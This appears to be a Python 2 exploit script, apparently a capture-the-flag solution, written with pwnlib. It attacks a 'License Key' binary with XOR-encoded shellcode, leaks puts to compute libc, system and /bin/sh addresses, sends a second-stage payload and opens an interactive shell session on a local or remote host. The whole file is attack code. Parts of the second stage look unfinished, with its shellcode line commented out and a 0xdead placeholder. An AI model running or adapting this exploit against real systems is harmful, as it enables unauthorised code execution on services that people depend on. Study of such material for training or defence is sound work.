from pwnlib import *

LOCAL = True

shellcode = assemble("""

; puts(puts)
mov rdi, 0x601418
call [rdi]

push 0x4009e0
ret


""")

print "len:", len(shellcode)

assert len(shellcode) <= 0x10
shellcode += "\x11"*(0x10 - len(shellcode))


payload = "A"*0x11


base = 	"""0x3f	0x8e	0x07	0x49	0x8a	0x21	0x83	0xea
	0xf1	0xf5	0xbe	0xb5	0x27	0xa5 0x80	"""

base = base.replace("0x", "").replace(" ", "").replace("\t", "").strip()
base = base.replace("\n", "").decode("hex")


payload += xor(xor(shellcode, base), "\x01"*0x10)


assert "\n" not in payload

if LOCAL:
	s = Socket(("localhost", 5553))
	puts_o = 0x6fe30
	bin_sh_o = 1559771
	system_o = 0x46640
else:
	s = Socket(("104.154.90.175", 54509 ))
	puts_o = 0x6b990
	system_o = 0x41490
	bin_sh_o = 1455080

s.ru("License Key: ")
s.send(payload[:0x11+15])


s.ru("Starting protected code...\n")
leaked = s.ru("Welcome to ca")
puts = uq(leaked.ljust(8, chr(0)))

print "puts: 0x%x" % puts

libc = puts - puts_o
system = libc + system_o
bin_sh = bin_sh_o + libc

assert libc & 0xfff == 0



########################################


shellcode = assemble("""

mov rdx, [rax+0x6014a0]
push rsp
pop rdi
pop rsi
jmp 0xfffffe58


""")

print "len:", len(shellcode)

assert len(shellcode) <= 0x10
shellcode += "\x11"*(0x10 - len(shellcode))


payload = "A"*0x11


base = 	"""0x3f	0x8e	0x07	0x49	0x8a	0x21	0x83	0xea
	0xf1	0xf5	0xbe	0xb5	0x27	0xa5 0x80	"""

base = base.replace("0x", "").replace(" ", "").replace("\t", "").strip()
base = base.replace("\n", "").decode("hex")


#payload += xor(xor(shellcode, base), "\x01"*0x10)
payload += "\x00"*0x11


assert "\n" not in payload


s.ru("License Key: ")
s.send(payload[:0x11+15])


payload = "B"*8
payload += pq(0xdead)



assert "\n" not in payload

s.send(payload + "\n")



s.interact()
